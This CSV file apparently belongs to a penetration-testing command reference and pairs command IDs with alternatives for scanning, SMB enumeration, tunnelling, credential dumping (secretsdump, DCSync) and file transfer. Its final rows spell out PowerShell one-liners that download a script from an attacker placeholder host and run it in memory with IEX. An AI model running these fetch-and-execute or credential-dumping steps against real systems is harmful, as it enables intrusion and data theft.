"command_id","alternative_command_id"
"nmap-vuln-scan","nessus-scan"
"dns-enum","dnsenum-domain"
"smb-null-session-shares","smb-smbmap-recursive"
"smb-null-session-shares","smb-crackmapexec-shares"
"smb-enum4linux-full","smb-crackmapexec-shares"
"smb-enum4linux-full","smb-null-session-shares"
"smb-crackmapexec-shares","smb-smbmap-recursive"
"smb-crackmapexec-shares","smb-enum4linux-full"
"smb-smbclient-connect","smb-mount-share"
"smb-smbclient-connect","smb-smbmap-recursive"
"smb-smbmap-recursive","smb-smbclient-connect"
"smb-smbmap-recursive","smb-mount-share"
"smb-mount-share","smb-smbclient-connect"
"smb-mount-share","smb-smbmap-recursive"
"curl-header-enum","whatweb-technology-detection"
"curl-header-enum","nmap-service-scan"
"whatweb-technology-detection","curl-header-enum"
"whatweb-technology-detection","nmap-service-scan"
"iptables-list-rules","ufw-status"
"iptables-list-rules","firewalld-list-all"
"iptables-allow-port","ufw-allow-port"
"ufw-status","iptables-list-rules"
"ufw-status","firewalld-list-all"
"ufw-allow-port","iptables-allow-port"
"firewalld-list-all","iptables-list-rules"
"firewalld-list-all","ufw-status"
"netsh-firewall-show","netsh-firewall-show-state"
"netsh-firewall-show-state","netsh-firewall-show"
"service-ssh-start-sysvinit","systemctl-start-ssh"
"nmap-localhost-verification","netstat-listening-tcp"
"nmap-localhost-verification","ss-listening-all"
"ssh-local-port-forward-inline","ssh-local-port-forward"
"crackmapexec-smb-framework","cme-smb-shares"
"wmic-os-version-specific","systeminfo-windows"
"wmic-os-version-specific","get-computerinfo"
"whoami-all-windows","whoami-priv"
"chisel-http-tunneling","ssh-dynamic-port-forward"
"chisel-http-tunneling","sshuttle-vpn"
"plink-remote-forward-windows","plink-remote-forward"
"proxychains-config-verify","proxychains-config"
"systemctl-start-ssh","service-ssh-start-sysvinit"
"ss-listening-ports","nmap-localhost-verification"
"ip-route","netstat-routing-table"
"nmap-port-check","curl-http-service-verification"
"plink-remote-forward","chisel-http-tunneling"
"ssh-connect-password","ssh-key-authentication"
"rustscan-fast-scan","nmap-quick-scan"
"rustscan-fast-scan","masscan-fast-scan"
"enum4linux-smb","enum4linux-ng"
"enum4linux-ng","enum4linux-smb"
"dnsrecon-domain","dnsenum-domain"
"dnsrecon-domain","dig-zone-transfer"
"ffuf-dir-fuzz","gobuster-dir-basic"
"ffuf-dir-fuzz","wfuzz-dir"
"gobuster-dir-basic","ffuf-dir-fuzz"
"gobuster-dir-basic","wfuzz-dir"
"wfuzz-dir","gobuster-dir-basic"
"wfuzz-dir","ffuf-dir-fuzz"
"php-http-server","ruby-http-server"
"ruby-http-server","php-http-server"
"powershell-wget","powershell-invoke-webrequest"
"socat-listener","nc-listener"
"hashid-identify","hash-identifier"
"smbexec-shell","psexec-shell"
"smbexec-shell","wmiexec-shell"
"secretsdump-hashes","ad-dcsync-mimikatz-single-user"
"secretsdump-hashes","ad-dcsync-impacket-secretsdump-user"
"sc-qc-service","get-service"
"ldap-dn-path-check","ldapsearch-ad"
"check-robots-txt","nikto-scan"
"awk-print","cut-fields"
"cut-fields","awk-print"
"base64-encode","base64-decode"
"base64-decode","base64-encode"
"xxd-hex","hexdump-file"
"hexdump-file","xxd-hex"
"od-octal-dump","xxd-hex"
"od-octal-dump","hexdump-file"
"pip-install","pip3-install"
"pip3-install","pip-install"
"yum-install","dnf-install"
"yum-install","apt-install"
"dnf-install","yum-install"
"dnf-install","apt-install"
"go-get","go-install"
"go-install","go-get"
"choco-install","winget-install"
"winget-install","choco-install"
"scoop-install","choco-install"
"scoop-install","winget-install"
"traceroute-host","tracert-windows"
"tracert-windows","traceroute-host"
"dig-dns","nslookup-dns"
"dig-dns","host-dns"
"nslookup-dns","dig-dns"
"nslookup-dns","host-dns"
"host-dns","dig-dns"
"host-dns","nslookup-dns"
"curl-url","wget-url"
"wget-url","curl-url"
"scp-file","rsync-files"
"rsync-files","scp-file"
"telnet-connect","nc-connect"
"chmod-executable","chmod-numeric-permissions"
"chmod-numeric-permissions","chmod-executable"
"chmod-writable","chmod-numeric-permissions"
"cp-file","rsync-files"
"cat-file","head-file"
"cat-file","tail-file"
"cat-file","less-file"
"head-file","cat-file"
"head-file","less-file"
"tail-file","cat-file"
"tail-file","less-file"
"less-file","cat-file"
"tar-extract","unzip-file"
"tar-extract","gunzip-decompress"
"unzip-file","tar-extract"
"gzip-compress","tar-create"
"gunzip-decompress","tar-extract"
"verify-curl-available","python-http-server"
"verify-curl-available","nc-file-transfer"
"verify-credentials","verify-credentials"
"verify-credentials","verify-credentials"
"verify-port-open","nmap-port-check"
"verify-smb-null-session","smb-crackmapexec-shares"
"ft-certutil-download","ft-powershell-iwr"
"ft-certutil-download","ft-powershell-webclient"
"ft-certutil-download","ft-bitsadmin-download"
"ft-powershell-iwr","ft-certutil-download"
"ft-powershell-iwr","ft-powershell-webclient"
"ft-powershell-webclient","ft-powershell-iwr"
"ft-powershell-webclient","ft-certutil-download"
"ft-smb-download","ft-certutil-download"
"ft-smb-download","ft-powershell-webclient"
"ft-bitsadmin-download","ft-certutil-download"
"ft-bitsadmin-download","ft-powershell-webclient"
"ft-powershell-upload","ft-smb-upload"
"ft-powershell-upload","ft-nc-send"
"ft-powershell-upload","exfil-powershell-base64"
"ft-smb-upload","ft-powershell-upload"
"ft-smb-upload","ft-nc-send"
"ft-curl-upload","ft-nc-send"
"ft-curl-upload","ft-scp-upload"
"ft-nc-receive","ft-uploadserver"
"ft-nc-receive","ft-smb-server"
"ft-nc-send","ft-curl-upload"
"ft-nc-send","ft-bash-dev-tcp"
"ft-powershell-tcp-send","ft-nc-send"
"ft-powershell-tcp-send","ft-powershell-upload"
"ft-powershell-tcp-send","ft-smb-upload"
"ft-file-verify-md5","sha256sum <FILE> (SHA-256, more secure but slower)"
"ft-file-verify-md5","Get-FileHash <FILE> (PowerShell on Windows)"
"ft-file-verify-md5","certutil -hashfile <FILE> MD5 (Windows built-in)"
"ft-powershell-execute-memory","IWR -Uri http://<LHOST>/<SCRIPT>.ps1 -UseBasicParsing | IEX (PowerShell 3.0+)"
"ft-powershell-execute-memory","(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1') | IEX (explicit pipe)"
"ft-powershell-execute-memory","IEX (Get-Content \\<LHOST>\share\script.ps1 -Raw) (SMB-based)"
"ft-base64-encode","ft-nc-send"
"ft-base64-encode","ft-curl-upload"
"ft-scp-upload","ft-wget-download"
"ft-scp-upload","ft-curl-upload"
"ft-scp-download","ft-curl-upload"
